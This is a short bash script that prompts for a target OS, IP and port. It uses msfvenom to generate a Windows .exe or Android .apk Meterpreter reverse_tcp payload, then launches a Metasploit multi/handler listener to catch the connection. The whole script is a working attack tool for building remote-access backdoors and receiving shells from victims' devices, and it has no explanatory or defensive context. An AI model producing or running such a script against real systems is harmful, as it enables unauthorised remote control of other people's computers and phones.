#!/bin/bash

echo "Enter Your Target OS In Small Letters : "
read OS

echo "Enter Your IP : "
read IP

echo "Enter Desired Port : "
read PORT

if [ $OS == "windows" ]; then

  echo "Creating Payload For Windows"

  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f exe -o payload.exe

fi

if [ $OS == "android" ]; then

  echo "Creating Payload For Android"

  msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f apk -o payload.apk

fi

echo "Running Exploit"

msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $OS/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; exploit;"

